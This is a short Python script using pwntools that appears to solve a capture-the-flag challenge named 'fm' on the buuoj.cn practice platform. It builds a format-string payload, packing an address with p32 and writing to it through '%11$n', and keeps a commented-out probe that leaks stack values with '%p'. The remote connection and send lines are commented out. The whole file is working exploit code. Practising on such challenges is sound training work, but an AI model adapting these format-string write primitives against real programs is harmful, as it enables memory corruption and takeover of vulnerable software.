from pwn import *
#sh = process("./fm")
#sh = remote("node5.buuoj.cn",26322)
#payload = b"AAAA %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p"
a = 0x0804a02c
b = 0x804C044
payload =p32(b)+b"%11$n"
print(payload)
#sh.sendline(payload)
#sh.interactive()

